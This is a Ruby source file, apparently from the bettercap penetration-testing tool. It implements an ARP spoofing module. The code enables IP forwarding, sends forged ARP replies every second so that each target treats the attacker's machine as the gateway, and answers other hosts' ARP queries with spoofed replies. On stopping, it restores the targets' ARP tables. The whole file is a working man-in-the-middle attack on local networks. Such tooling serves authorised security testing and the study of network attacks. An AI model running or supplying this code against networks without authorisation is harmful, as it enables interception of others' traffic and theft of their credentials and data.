=begin

BETTERCAP

Author : Simone 'evilsocket' Margaritelli
Email  : evilsocket@gmail.com
Blog   : http://www.evilsocket.net/

This project is released under the GPL 3 license.

=end
require 'bettercap/error'
require 'bettercap/context'
require 'bettercap/base/ispoofer'
require 'bettercap/network'
require 'bettercap/logger'
require 'colorize'

class ArpSpoofer < ISpoofer
  def initialize
    @ctx          = Context.get
    @gw_hw        = nil
    @forwarding   = @ctx.firewall.forwarding_enabled?
    @spoof_thread = nil
    @sniff_thread = nil
    @capture      = nil
    @running      = false

    Logger.debug 'ARP SPOOFER SELECTED'

    Logger.info "Getting gateway #{@ctx.gateway} MAC address ..."
    @gw_hw = Network.get_hw_address( @ctx.ifconfig, @ctx.gateway )
    if @gw_hw.nil?
      raise BetterCap::Error, "Couldn't determine router MAC"
    end

    Logger.info "  Gateway : #{@ctx.gateway} ( #{@gw_hw} )"
  end

  def send_spoofed_packet( saddr, smac, daddr, dmac )
    pkt = PacketFu::ARPPacket.new
    pkt.eth_saddr = smac
    pkt.eth_daddr = dmac
    pkt.arp_saddr_mac = smac
    pkt.arp_daddr_mac = dmac
    pkt.arp_saddr_ip = saddr
    pkt.arp_daddr_ip = daddr
    pkt.arp_opcode = 2

    pkt.to_w(@ctx.ifconfig[:iface])
  end

  def start
    stop() unless @running == false

    Logger.info 'Starting ARP spoofer ...'

    if @forwarding == false
      Logger.debug 'Enabling packet forwarding.'

      @ctx.firewall.enable_forwarding(true)
    end

    @running = true
    @sniff_thread = Thread.new do
      Logger.info 'ARP watcher started ...'

      @capture = Capture.new(
          iface: @ctx.options[:iface],
          filter: 'arp',
          start: true
      )

      @capture.stream.each do |p|
        begin
          pkt = Packet.parse p
          # we're only interested in 'who-has' packets
          if pkt.arp_opcode == 1 and pkt.arp_dst_mac.to_s == '00:00:00:00:00:00'
            is_from_us = ( pkt.arp_src_ip.to_s == @ctx.ifconfig[:ip_saddr] )

            if !is_from_us
              Logger.info "[ARP] #{pkt.arp_src_ip.to_s} is asking who #{pkt.arp_dst_ip.to_s} is."

              send_spoofed_packet pkt.arp_dst_ip.to_s, @ctx.ifconfig[:eth_saddr], pkt.arp_src_ip.to_s, pkt.arp_src_mac.to_s
            end
          end
        rescue Exception => e
          Logger.error e.message
        end
      end
    end

    @spoof_thread = Thread.new do
      prev_size = @ctx.targets.size
      loop do
        if not @running
            Logger.debug 'Stopping spoofing thread ...'
            Thread.exit
            break
        end

        size = @ctx.targets.size

        if size > prev_size
          Logger.warn "Aquired #{size - prev_size} new targets."
        elsif size < prev_size
          Logger.warn "Lost #{prev_size - size} targets."
        end

        Logger.debug "Spoofing #{@ctx.targets.size} targets ..."

        @ctx.targets.each do |target|
          # targets could change, update mac addresses if needed
          if target.mac.nil?
            Logger.warn "Getting target #{target.ip} MAC address ..."

            hw = Network.get_hw_address( @ctx.ifconfig, target.ip )
            if hw.nil?
              Logger.warn "Couldn't determine target MAC"
              next
            else
              Logger.info "  Target MAC    : #{hw}"

              target.mac = hw
            end
          end

          send_spoofed_packet @ctx.gateway, @ctx.ifconfig[:eth_saddr], target.ip, target.mac
        end

        prev_size = @ctx.targets.size

        sleep(1)
      end
    end
  end

  def stop
    raise 'ARP spoofer is not running' unless @running

    Logger.info 'Stopping ARP spoofer ...'

    Logger.debug "Resetting packet forwarding to #{@forwarding} ..."
    @ctx.firewall.enable_forwarding( @forwarding )

    @running = false
    @spoof_thread.join

    Logger.info "Restoring ARP table of #{@ctx.targets.size} targets ..."

    @ctx.targets.each do |target|
      if !target.mac.nil?
        send_spoofed_packet @ctx.gateway, @gw_hw, target.ip, target.mac
      end
    end
    sleep 1
  end
end
